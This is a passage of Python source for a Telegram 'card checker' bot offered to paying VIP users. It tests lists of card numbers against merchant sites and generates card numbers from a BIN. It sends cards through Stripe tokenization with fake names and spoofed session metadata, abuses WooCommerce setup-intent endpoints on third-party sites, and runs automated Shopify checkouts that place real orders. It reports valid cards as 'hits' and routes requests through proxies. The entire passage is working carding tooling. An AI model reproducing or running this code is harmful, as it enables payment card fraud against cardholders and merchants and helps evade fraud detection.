        config_id  = str(uuid.uuid4())
        _muid      = str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999))
        _sid       = str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999))
        _guid      = str(uuid.uuid4())
        _top       = random.randint(30000, 180000)   # realistic time-on-page
        _fname     = random.choice(["James","Emily","Alex","Sarah","Michael","Jessica"])
        _lname     = random.choice(["Smith","Johnson","Williams","Brown","Davis"])
        _zip       = random.choice(["10001","90210","60601","77001","30301"])

        stripe_data = (
            f'type=card'
            f'&card[number]={cn}'
            f'&card[cvc]={cvc}'
            f'&card[exp_year]={yy}'
            f'&card[exp_month]={mm}'
            f'&billing_details[name]={_fname}+{_lname}'
            f'&billing_details[email]={email}'
            f'&billing_details[address][country]=US'
            f'&billing_details[address][postal_code]={_zip}'
            f'&allow_redisplay=unspecified'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&referrer={site}'
            f'&time_on_page={_top}'
            f'&client_attribution_metadata[client_session_id]={sess_id}'
            f'&client_attribution_metadata[merchant_integration_source]=elements'
            f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
            f'&client_attribution_metadata[merchant_integration_version]=2021'
            f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
            f'&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
            f'&client_attribution_metadata[elements_session_config_id]={config_id}'
            f'&muid={_muid}'
            f'&sid={_sid}'
            f'&guid={_guid}'
            f'&key={pks}'
            + (f'&_stripe_account={acct}' if acct else '')
        )
        sr = requests.post('https://api.stripe.com/v1/payment_methods', headers={
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': UA,
        }, data=stripe_data, timeout=20)
        sr_json = sr.json()

        if 'error' in sr_json:
            err = sr_json['error']
            return {"status": "dead", "message": err.get('message', 'Tokenization failed')[:80], "elapsed": round(time.time()-t0,2)}

        pm_id = sr_json.get('id', '')
        if not pm_id:
            return {"status": "error", "message": "No payment method ID returned", "elapsed": round(time.time()-t0,2)}

        # ── Step 4: Create setup intent — multi-action retry (DLX improved) ──
        # Try 3 different action/field combos: wcpay, stripe-classic, stripe-old
        _ajax_attempts = [
            {'action': 'create_setup_intent',                       'pm_field': 'wcpay-payment-method'},
            {'action': 'wc_stripe_create_and_confirm_setup_intent', 'pm_field': 'wc-stripe-payment-method'},
            {'action': 'wc_stripe_create_setup_intent',             'pm_field': 'wc-stripe-payment-method'},
        ]
        ir = None
        resp = {}
        elapsed = round(time.time()-t0, 2)
        for _attempt in _ajax_attempts:
            try:
                mp_data = MultipartEncoder({
                    'action':              (None, _attempt['action']),
                    _attempt['pm_field']:  (None, pm_id),
                    '_ajax_nonce':         (None, nonce),
                })
                ir = sess.post(f'{site}/wp-admin/admin-ajax.php', headers={
                    'Accept': '*/*',
                    'Content-Type': mp_data.content_type,
                    'Origin': site,
                    'Referer': f'{site}/my-account/add-payment-method/',
                    'User-Agent': UA,
                    'X-Requested-With': 'XMLHttpRequest',
                }, data=mp_data, timeout=30)
                elapsed = round(time.time()-t0, 2)
                if ir.status_code == 200:
                    try:
                        resp = ir.json()
                    except Exception:
                        resp = {}
                    # If we got a meaningful response, stop retrying
                    if resp and resp != {} and '0' not in str(resp):
                        break
            except Exception:
                continue

        result_val = resp.get('result', '')
        resp_text  = str(resp).lower()

        # Success
        if result_val == 'success' or resp.get('status') == 'succeeded':
            return {"status": "approved", "message": "Approved — $0 Auth", "elapsed": elapsed}

        # Insufficient funds (card alive but no balance)
        if 'insufficient' in resp_text or 'insufficient_funds' in resp_text:
            return {"status": "approved", "message": "Insufficient Funds — Card Alive", "elapsed": elapsed}

        # CVC match
        if 'incorrect_cvc' in resp_text or 'cvc_check_fail' in resp_text:
            return {"status": "approved", "message": "CVC Matched — Card Valid", "elapsed": elapsed}

        # 3DS required
        cs = resp.get('client_secret', '')
        if cs or 'requires_action' in resp_text or '3d_secure' in resp_text:
            return {"status": "approved", "message": "OTP / 3DS Required", "elapsed": elapsed}

        # Failure — extract clean message
        if result_val == 'failure' or 'messages' in resp:
            raw_msg = resp.get('messages', resp.get('message', str(resp)))
            from bs4 import BeautifulSoup
            clean = BeautifulSoup(str(raw_msg), 'html.parser').get_text()[:80]
            cl = clean.lower()
            if any(x in cl for x in ('otp', '3d', 'authenticat', 'secure', 'verify')):
                return {"status": "approved", "message": "OTP / 3DS Required", "elapsed": elapsed}
            return {"status": "dead", "message": clean or "Declined", "elapsed": elapsed}

        return {"status": "dead", "message": str(resp)[:80] or "Declined", "elapsed": elapsed}

    except Exception as e:
        return {"status": "error", "message": str(e)[:80], "elapsed": round(time.time()-t0,2)}


@bot.message_handler(commands=["wcs"])
def wcs_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as f:
            json_data = json.load(f)
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode='HTML')
            return

        usage_msg = (
            "<b>╔══════════════════════════════╗\n"
            "║  🔵 WOOCOMMERCE STRIPE AUTH  ║\n"
            "╚══════════════════════════════╝\n\n"
            "🔰 Gateway  »  WooCommerce + Stripe\n"
            "⚡ Method    »  Auth / $0 Charge\n\n"
            "━━━━━ 📌 Usage ━━━━━━━━━━━━━━━━━\n\n"
            "▸ Single card (custom site):\n"
            "<code>/wcs https://site.com 4111...|12|26|123</code>\n\n"
            "▸ Single card (assoc site):\n"
            "<code>/wcs assoc 4111...|12|26|123</code>\n\n"
            "▸ Multi card:\n"
            "<code>/wcs https://site.com\n"
            "card1|mm|yy|cvv\n"
            "card2|mm|yy|cvv</code>\n\n"
            "━━━━━ 💡 Tips ━━━━━━━━━━━━━━━━━━\n\n"
            "🔹 <code>assoc</code> = associationsmanagement.com\n"
            "🔹 5 pre-loaded accounts available\n"
            "🔹 Format: <code>card|mm|yy|cvv</code>\n\n"
            "⌤ Dev by: YADISTAN 🍀</b>"
        )

        # ── Parse site URL + cards ─────────────────────────────────────────
        try:
            lines = message.text.split('\n')
            first_parts = lines[0].split(None, 2)   # [cmd, site?, card?]
            if len(first_parts) < 2:
                raise IndexError

            site_url = first_parts[1].strip()
            _is_assoc = site_url.lower() in ('assoc', 'associationsmanagement', 'associationsmanagement.com')
            if not _is_assoc and not site_url.startswith('http') and '.' not in site_url:
                raise ValueError

            raw_lines = []
            if len(first_parts) == 3:                       # inline card on first line
                raw_lines.append(first_parts[2])
            if len(lines) > 1:                              # cards on subsequent lines
                raw_lines += [l.strip() for l in lines[1:] if l.strip()]
        except (IndexError, ValueError):
            bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        card_lines = []
        for rl in raw_lines:
            cc = _extract_cc(rl)
            if cc:
                card_lines.append(cc)

        if not card_lines:
            bot.reply_to(message,
                "<b>❌ Invalid card format.\n"
                "Correct: <code>4111111111111111|12|26|123</code></b>", parse_mode='HTML') if raw_lines else bot.reply_to(message, usage_msg, parse_mode='HTML')
            return

        if len(card_lines) > 999999:
            bot.reply_to(message, "<b>❌ Maximum 999999 cards at a time.</b>", parse_mode='HTML')
            return

        # ── Single card ────────────────────────────────────────────────────
        if len(card_lines) == 1:
            card    = card_lines[0]
            bin_num = card.replace('|','')[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)
            log_command(message, query_type='gateway', gateway='wcs')
            _site_display = "associationsmanagement.com (assoc)" if _is_assoc else site_url[:50]
            msg = bot.reply_to(message,
                f"<b>⏳ Checking [WCS Auth]...\n"
                f"🌐 Site: <code>{_site_display}</code>\n"
                f"💳 Card: <code>{card}</code></b>", parse_mode='HTML')

            if _is_assoc:
                result = _wcs_assoc_call(card)
            else:
                result = _wcs_v3_call(site_url, card)
                if result.get("status") == "error" and "nonce not found" in result.get("message","").lower():
                    result = _wcs_call(site_url, card)
            s       = result.get("status","").lower()
            m       = result.get("message","")
            elapsed = result.get("elapsed",0)

            if s == "approved":
                em, word = ("⚡","OTP") if "OTP" in m else ("✅","Approved")
            elif s == "dead":
                em, word = "❌", "Dead"
            else:
                em, word = "🔴", "Error"

            log_card_check(id, card, 'wcs', m[:80])
            out = (
                f"<b>{em} {word}  ❯  <code>{card}</code>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🏦 BIN: {bin_num}  •  {bin_info}\n"
                f"🏛️ Bank: {bank}\n"
                f"🌍 Country: {country} {country_code}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"🌐 Site: {_site_display}\n"
                f"🎯 Gate: {'WCS Assoc (5 Accounts)' if _is_assoc else 'WooCommerce Stripe ($0)'}\n"
                f"💬 Msg: {m[:80]}\n"
                f"⏱️ Time: {elapsed}s\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"[⌤] Bot by @yadistan</b>"
            )
            bot.edit_message_text(out, message.chat.id, msg.message_id, parse_mode='HTML')
            return

        # ── Bulk ──────────────────────────────────────────────────────────
        total    = len(card_lines)
        approved = dead = err = otp = checked = 0
        results_lines = []
        hits = []

        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}

        _site_display_bulk = "associationsmanagement.com (assoc)" if _is_assoc else site_url[:40]
        log_command(message, query_type='gateway', gateway='wcs')
        msg = bot.reply_to(message,
            f"<b>🔵 WCS Auth | {_site_display_bulk}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📋 Total: {total} cards\n⏳ Starting...</b>",
            reply_markup=stop_kb, parse_mode='HTML')

        def build_wcs_msg(status_text="⏳ Checking..."):
            header = (f"<b>🔵 WCS Auth | {status_text}\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n"
                      f"🌐 {_site_display_bulk}\n"
                      f"📊 {checked}/{total} | ✅ {approved} | ⚡ {otp} | ❌ {dead} | 🔴 {err}\n"
                      f"━━━━━━━━━━━━━━━━━━━━\n")
            body = "\n".join(results_lines[-10:])
            footer_hits = ""
            if hits:
                hits_lines = "".join(
                    f"\n{hem} <b>{hw}</b>\n<code>{hcc}</code>\n<b>Msg:</b> {hres.get('message','')[:60]}\n<b>Time:</b> {hres.get('elapsed',0):.2f}s\n"
                    for hcc, hres, hem, hw in hits[-5:]
                )
                footer_hits = f"\n━━━━━━━━━━━━━━━━━━━━\n🎯 HITS ({len(hits)}):" + hits_lines
            full = header + body + footer_hits + "\n━━━━━━━━━━━━━━━━━━━━\n[⌤] Bot by @yadistan</b>"
            if len(full) > 4000:
                full = header + "\n".join(results_lines[-5:]) + footer_hits + "\n[⌤] Bot by @yadistan</b>"
            return full

        for cc in card_lines:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_wcs_msg("🛑 STOPPED"), parse_mode='HTML')
                except: pass
                return

            if _is_assoc:
                result = _wcs_assoc_call(cc)
            else:
                result = _wcs_v3_call(site_url, cc)
                if result.get("status") == "error" and "nonce not found" in result.get("message","").lower():
                    result = _wcs_call(site_url, cc)
            checked += 1
            s       = result.get("status","").lower()
            m       = result.get("message","")
            log_card_check(id, cc, 'wcs', m[:80])

            if s == "approved" and "OTP" in m:
                em, word = "⚡", "OTP"
                otp += 1
                hits.append((cc, result, em, word))
            elif s == "approved":
                em, word = "✅", "Approved"
                approved += 1
                hits.append((cc, result, em, word))
            elif s == "error":
                em, word = "🔴", "Error"
                err += 1
            else:
                em, word = "❌", "Dead"
                dead += 1

            results_lines.append(f"{em} <b>{word}</b> — {m[:50]}  ❯  <code>{cc}</code>")

            if checked % 3 == 0 or checked == total:
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=build_wcs_msg(), parse_mode='HTML', reply_markup=stop_kb)
                    time.sleep(0.5)
                except Exception:
                    time.sleep(1)

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=build_wcs_msg("✅ DONE"), parse_mode='HTML')
        except: pass

    threading.Thread(target=my_function).start()


# ── Auto Shopify v6 helpers — autoshopify.py method ──────────────────────────
def _asp_session(proxy_dict=None):
    import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    if proxy_dict:
        s.proxies = proxy_dict; s.verify = False
    a = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
    s.mount('http://', a); s.mount('https://', a)
    return s

def _asp_random_ua():
    v = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v} Safari/537.36"

def _asp_random_name():
    f = ['John','Jane','Michael','Sarah','David','Emily','James','Emma','Robert','Olivia']
    l = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Wilson','Taylor']
    return random.choice(f), random.choice(l)

def _asp_random_addr():
    data = [
        ('1600 Pennsylvania Ave NW','','Washington','DC','20500','202'),
        ('350 Fifth Avenue','','New York','NY','10118','212'),
        ('233 S Wacker Dr','','Chicago','IL','60606','312'),
        ('1 Infinite Loop','','Cupertino','CA','95014','408'),
        ('1 Microsoft Way','','Redmond','WA','98052','425'),
    ]
    a = random.choice(data)
    phone = f"+1{a[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
    return {'address1': a[0], 'address2': a[1], 'city': a[2], 'countryCode': 'US',
            'postalCode': a[4], 'zoneCode': a[3], 'phone': phone}

def _asp_find_product(site, proxy_dict=None):
    """Find cheapest product on any Shopify store. Returns (variant_id, price, handle, status)."""
    try:
        sess = _asp_session(proxy_dict)
        sess.headers.update({"User-Agent": _asp_random_ua()})
        resp = sess.get(f"https://{site}/products.json?limit=250", timeout=15)
        if resp.status_code != 200:
            return None, None, None, "PRODUCTS_FETCH_FAILED"
        products = resp.json().get('products', [])
        cheapest_variant = None; cheapest_price = float('inf'); product_handle = None
        for product in products:
            for variant in product.get('variants', []):
                price = float(variant.get('price', 999999))
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest_variant = variant['id']
                    product_handle = product.get('handle', '')
        if not cheapest_variant:
            return None, None, None, "NO_PRODUCT_FOUND"
        return cheapest_variant, cheapest_price, product_handle, "OK"
    except Exception as e:
        return None, None, None, str(e)[:50]

def _asp_create_checkout(site, variant_id, product_handle, proxy_dict=None):
    """Create Shopify checkout session. Returns (checkout_data, status, msg)."""
    ua = _asp_random_ua()
    sess = _asp_session(proxy_dict)
    sess.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*"})
    try:
        sess.get(f'https://{site}', timeout=15)
        time.sleep(random.uniform(0.5, 1.5))

        headers = {'accept': 'application/json', 'content-type': 'application/json',
                   'origin': f'https://{site}', 'referer': f'https://{site}/products/{product_handle or ""}',
                   'user-agent': ua, 'x-requested-with': 'XMLHttpRequest'}
        cart_ok = False
        for attempt in range(3):
            resp = sess.post(f'https://{site}/cart/add.js', headers=headers,
                             json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=30)
            if resp.status_code == 200:
                cart_ok = True
                break
            if resp.status_code == 429:
                time.sleep(2 + attempt * 2)
                continue
            headers2 = {'origin': f'https://{site}', 'referer': f'https://{site}/products/{product_handle or ""}',
                        'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded'}
            resp = sess.post(f'https://{site}/cart/add',
                             data={'id': str(variant_id), 'quantity': '1'},
                             headers=headers2, timeout=30)
            if resp.status_code == 200:
                cart_ok = True
                break
            time.sleep(1 + attempt)
        if not cart_ok:
            return None, 'ERROR', f'ADD_TO_CART_FAILED ({resp.status_code})'
        resp = sess.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''},
                         allow_redirects=True, timeout=30)
        if 'checkout' not in resp.url:
            return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
        checkout_resp = sess.get(resp.url, allow_redirects=True, timeout=30)
        checkout_text = checkout_resp.text
        lower = checkout_text.lower()
        if 'verifying your connection' in lower or 'checking your browser' in lower:
            return None, 'BLOCKED', 'CLOUDFLARE_CHALLENGE'
        if 'access denied' in lower:
            return None, 'BLOCKED', 'ACCESS_DENIED'
        shopify_sig = None
        for pat in [r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
                    r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
                    r'callerIdentificationSignature["\s:]+([^"&\s]+)']:
            m = re.search(pat, checkout_text)
            if m:
                shopify_sig = m.group(1).replace('&quot;', '').strip()
                if shopify_sig and len(shopify_sig) > 10:
                    break
                shopify_sig = None
        if not shopify_sig:
            return None, 'ERROR', 'NO_SIGNATURE'
        m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
        session_token = m.group(1).replace('&quot;', '').strip() if m else None
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
        queue_token = m.group(1) if m else None
        m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
        stable_id = m.group(1) if m else str(uuid.uuid4())
        m = (re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or
             re.search(r'/checkouts/([^/]+)/', checkout_resp.url))
        checkout_source_id = m.group(1) if m else ''
        m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
        payment_method_id = m.group(1) if m else None
        return {'site': site, 'session': sess, 'ua': ua, 'sig': shopify_sig,
                'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
                'checkout_source_id': checkout_source_id, 'build_id': build_id,
                'payment_method_id': payment_method_id, 'checkout_url': checkout_resp.url}, 'OK', 'READY'
    except Exception as e:
        return None, 'ERROR', str(e)[:30]

def _asp_check_card(checkout_data, card, variant_id, price, require_shipping=None):
    """Submit card via Shopify GraphQL checkout. Returns (status, msg, price)."""
    try:
        parts = card.split("|")
        card_number = parts[0]; month = int(parts[1])
        year = int("20" + parts[2]) if len(parts[2]) == 2 else int(parts[2])
        cvv = parts[3].strip()
        site = checkout_data['site']; sess = checkout_data['session']; ua = checkout_data['ua']
        sig = checkout_data['sig']; session_token = checkout_data['session_token']
        queue_token = checkout_data['queue_token']; stable_id = checkout_data['stable_id']
        checkout_source_id = checkout_data['checkout_source_id']; build_id = checkout_data['build_id']
        payment_method_id = checkout_data['payment_method_id']; checkout_url = checkout_data['checkout_url']
        first_name, last_name = _asp_random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = _asp_random_addr(); addr['firstName'] = first_name; addr['lastName'] = last_name
        pay_sess = _asp_session()
        pay_headers = {'accept': 'application/json', 'content-type': 'application/json',
                       'origin': 'https://checkout.pci.shopifyinc.com',
                       'shopify-identification-signature': sig, 'user-agent': ua}
        resp = pay_sess.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers,
                             json={'credit_card': {'number': card_number, 'month': month, 'year': year,
                                   'verification_value': cvv, 'name': cardholder},
                                   'payment_session_scope': site.replace('www.', '')}, timeout=30)
        if resp.status_code != 200:
            return 'ERROR', 'PCI_FAILED', price
        payment_session_id = resp.json().get('id')
        if not payment_session_id:
            return 'ERROR', 'NO_SESSION_ID', price
        if require_shipping:
            delivery = {'deliveryLines': [{'destination': {'streetAddress': addr},
                'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions':
                    {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True}
        else:
            delivery = {'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions':
                    {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True}
        gql_headers = {'accept': 'application/json', 'content-type': 'application/json',
                       'origin': f'https://{site}', 'referer': checkout_url, 'user-agent': ua,
                       'x-checkout-one-session-token': session_token or '',
                       'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
        rstr = lambda n: ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
        gql_data = {'variables': {'input': {
            'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
            'delivery': delivery,
            'merchandise': {'merchandiseLines': [{'stableId': stable_id,
                'merchandise': {'productVariantReference': {
                    'id': f'gid://shopify/ProductVariant/{variant_id}',
                    'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}}]},
            'payment': {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod':
                {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id or '',
                    'sessionId': payment_session_id, 'billingAddress': {'streetAddress': addr}}},
                'amount': {'any': True}}], 'billingAddress': {'streetAddress': addr}},
            'buyerIdentity': {'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}, 'email': email},
            'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
            'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
        }, 'attemptToken': f"{checkout_source_id}-{rstr(11)}"},
        'operationName': 'SubmitForCompletion',
        'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
        }
        resp = sess.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'},
                         headers=gql_headers, json=gql_data, timeout=60)
        if resp.status_code != 200:
            return 'ERROR', f'HTTP_{resp.status_code}', price
        result = resp.json(); resp_text = resp.text.lower()
        if 'errors' in result:
            err = result['errors'][0].get('message', 'ERROR')[:40]
            if 'delivery' in err.lower() and require_shipping is None:
                return _asp_check_card(checkout_data, card, variant_id, price, require_shipping=True)
            return 'ERROR', err, price
        completion = result.get('data', {}).get('submitForCompletion', {})
        if not completion:
            if 'card_declined' in resp_text: return 'DECLINED', 'CARD_DECLINED', price
            if 'insufficient' in resp_text:  return 'DECLINED', 'INSUFFICIENT_FUNDS', price
            return 'ERROR', 'NO_COMPLETION', price
        typename = completion.get('__typename', '')
        if typename == 'SubmitRejected':
            errors = completion.get('errors', [])
            if errors:
                err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                if 'DELIVERY' in err and require_shipping is None:
                    return _asp_check_card(checkout_data, card, variant_id, price, require_shipping=True)
                return 'DECLINED', err, price
            return 'DECLINED', 'REJECTED', price
        if typename == 'SubmitFailed':
            return 'DECLINED', completion.get('reason', 'FAILED'), price
        receipt = completion.get('receipt', {}); receipt_type = receipt.get('__typename', '')
        receipt_id = receipt.get('id')
        if receipt_type == 'ProcessedReceipt' or receipt.get('orderStatusPageUrl'):
            return 'CHARGED', 'ORDER_PLACED', price
        if receipt_type == 'FailedReceipt':
            err = receipt.get('processingError', {}).get('code', 'FAILED')
            return 'DECLINED', err, price
        if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
            poll_q = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
            for _ in range(15):
                time.sleep(2)
                try:
                    p = sess.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
                                  json={'variables': {'id': receipt_id, 'token': session_token or ''},
                                        'operationName': 'Poll', 'query': poll_q}, timeout=20)
                    if p.status_code == 200:
                        pd = p.json().get('data', {}).get('receipt', {}); pt = pd.get('__typename', '')
                        if pt == 'ProcessedReceipt' and pd.get('orderStatusPageUrl'):
                            return 'CHARGED', 'ORDER_PLACED', price
                        if pt == 'FailedReceipt':
                            return 'DECLINED', pd.get('processingError', {}).get('code', 'PAYMENT_FAILED'), price
                        if pt in ['ProcessingReceipt', 'WaitingReceipt']:
                            continue
                except: pass
            return 'ERROR', 'POLL_TIMEOUT', price
        if typename == 'Throttled':
            return 'ERROR', 'THROTTLED', price
        if 'card_declined' in resp_text: return 'DECLINED', 'CARD_DECLINED', price
        if 'insufficient' in resp_text:  return 'DECLINED', 'INSUFFICIENT_FUNDS', price
        return 'ERROR', typename if typename else resp.text[:40].replace('\n', ' '), price
    except Exception as e:
        return 'ERROR', str(e)[:40], price

def _asp_run(card, site_url, proxy_dict=None, _variant_id=None, _price=None, _handle=None):
    """Full autoshopify check for one card. Pass _variant_id/_price/_handle to skip product lookup.
    Returns (success_flag, response_code, gateway, price, currency)."""
    try:
        site = site_url.replace("https://", "").replace("http://", "").rstrip("/")
        if _variant_id:
            variant_id, price, product_handle = _variant_id, _price, _handle
        else:
            variant_id, price, product_handle, find_status = _asp_find_product(site, proxy_dict)
            if not variant_id:
                return False, find_status, "Shopify/Auto", "0.00", "USD"
        checkout_data, co_status, co_msg = _asp_create_checkout(site, variant_id, product_handle, proxy_dict)
        if co_status != 'OK':
            return False, co_msg, "Shopify/Auto", str(price or "0.00"), "USD"
        # Detect new Shopify checkout-web (SPA) — session_token missing from static HTML
        if not checkout_data.get('session_token'):
            # Fallback to old shopify_checker for new checkout-web stores
            parts = card.split('|')
            if len(parts) >= 4:
                cc_n, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3].strip()
                success, response, gateway, old_price, currency = _sp_check(cc_n, mm, yy, cvv, site_url)
                return success, response, gateway, old_price, currency
            return False, 'INVALID_CARD', 'Shopify/Auto', str(price or '0.00'), 'USD'
        status, msg, final_price = _asp_check_card(checkout_data, card, variant_id, price)
        success = status in ('CHARGED',)
        price_f = f"{float(final_price):.2f}" if final_price else "0.00"
        return success, msg, f"Shopify/Auto (${price_f})", price_f, "USD"
    except Exception as e:
        return False, str(e)[:60], "Shopify/Auto", "0.00", "USD"
# ─────────────────────────────────────────────────────────────────────────────

# ================== /sco — Stripe Checkout-Based Checker (External API) ==================
_SCO_API = "https://stripe-hitter.onrender.com"

def _sco_hit_api(ep, proxy_dict=None, timeout=60):
    for attempt in range(2):
        try:
            r = requests.get(ep, proxies=proxy_dict or {}, timeout=timeout)
            return r.json()
        except requests.exceptions.Timeout:
            if attempt == 0:
                time.sleep(2)
                continue
            return {"error": "API Timeout after retry"}
        except Exception as e:
            return {"error": str(e)[:60]}
    return {"error": "API failed"}

def _sco_luhn_ok(n):
    digs = [int(d) for d in str(n)]
    digs.reverse()
    t = 0
    for i, d in enumerate(digs):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        t += d
    return t % 10 == 0

def _sco_gen_card(bin6):
    prefix = bin6[:6]
    while True:
        mid = ''.join([str(random.randint(0, 9)) for _ in range(9)])
        base = prefix + mid
        for ck in range(10):
            if _sco_luhn_ok(base + str(ck)):
                cn = base + str(ck)
                mm = str(random.randint(1, 12)).zfill(2)
                yy = str(random.randint(26, 30))
                cvv = str(random.randint(100, 999))
                return f"{cn}|{mm}|{yy}|{cvv}"

def _sco_classify(rj):
    _rt = str(rj).lower()
    if any(x in _rt for x in ("insufficient", "insufficient_funds")):
        return "✅", "INSUF. FUNDS", True
    if any(x in _rt for x in ("incorrect_cvc", "cvc_check_fail")):
        return "✅", "CVC MATCHED", True
    if any(x in _rt for x in ("3ds", "requires_action", "otp", "authenticat", "3d_secure")):
        return "⚠️", "3DS / OTP", True
    if any(x in _rt for x in ("success", "approved", "paid", "succeeded")) and not rj.get("error"):
        return "✅", "APPROVED", True
    msg_lo = str(rj.get("message", "") or rj.get("error", "")).lower()
    if any(x in msg_lo for x in ("insufficient", "cvc", "3d", "otp", "authenticat", "succeed", "approved")):
        return "✅", "APPROVED", True
    return "❌", "DECLINED", False

@bot.message_handler(commands=["sco"])
def sco_command(message):
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "𝗙𝗥𝗘𝗘")
        except Exception:
            BL = "𝗙𝗥𝗘𝗘"
        if BL == "𝗙𝗥𝗘𝗘" and uid != admin:
            bot.reply_to(message, "<b>❌ This command is only for VIP users.</b>", parse_mode="HTML")
            return

        usage_msg = (
            "<b>╔══ 🔗 STRIPE CHECKOUT CHECKER ══╗\n\n"
            "📌 Single card check:\n"
